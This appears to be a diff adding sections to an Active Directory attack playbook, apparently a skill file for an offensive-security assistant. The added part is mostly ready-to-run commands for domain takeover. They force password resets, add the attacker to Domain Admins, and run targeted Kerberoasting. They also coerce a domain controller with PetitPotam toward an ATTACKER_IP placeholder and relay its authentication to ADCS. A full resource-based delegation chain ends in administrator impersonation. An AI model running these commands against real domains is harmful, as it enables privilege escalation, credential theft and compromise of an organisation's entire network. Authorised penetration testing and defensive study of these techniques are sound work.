@@ -80,3 +80,40 @@ Dangerous rights to look for in BloodHound:
 | WriteOwner | Change object owner |
 | WriteDACL | Modify object's ACL |
 | AllExtendedRights | Most dangerous extended rights |
+
+Abuse the rights remotely with `impacket`/`bloodyAD` rather than logging into the box:
+
+```bash
+# ForceChangePassword on a target user
+net rpc password "victim" "NewP@ss123" -U "domain/attacker%pass" -S DC_IP
+# Add yourself to a privileged group (AddMember)
+bloodyAD -u attacker -p pass -d domain.com --host DC_IP add groupMember "Domain Admins" attacker
+# Targeted Kerberoast after gaining GenericAll over a user (set a fake SPN)
+targetedKerberoast.py -u attacker -p pass -d domain.com
+```
+
+## Phase 6: Delegation & NTLM Relay
+
+| Delegation type | Abuse |
+|---|---|
+| Unconstrained | Compromise host → coerce a DC (PetitPotam/PrinterBug) → capture DC TGT → DCSync |
+| Constrained (S4U2Proxy) | Control an account trusted for delegation → `getST -impersonate administrator` to the target SPN |
+| Resource-Based (RBCD) | Have `GenericWrite`/`WriteDACL` on a computer → set `msDS-AllowedToActOnBehalfOfOtherIdentity` → impersonate any user to it |
+
+```bash
+# Coerce + relay to ADCS (ESC8) or LDAP for RBCD
+ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+PetitPotam.py -u user -p pass ATTACKER_IP DC_IP   # triggers the DC to authenticate to you
+
+# RBCD end-to-end
+addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ss' domain.com/user:pass
+rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write domain.com/user:pass
+getST.py -spn cifs/target.domain.com -impersonate administrator domain.com/EVIL$:'P@ss'
+```
+
+## Related Skills
+
+- `container-security` — Windows containers and AD-joined nodes connect a cluster breakout into this AD attack surface.
+- `cloud-iam-deep` — hybrid AD↔Entra/Azure AD joins mean DCSync'd creds or PRT theft can pivot into the cloud control plane.
+- `credential-attack` — feed cracked Kerberoast/AS-REP hashes and sprayed passwords into the foothold phase here.
+- `code-review` — when GPO scripts or LDAP-integrated app source is available, audit for hardcoded service-account credentials that shortcut the whole chain.
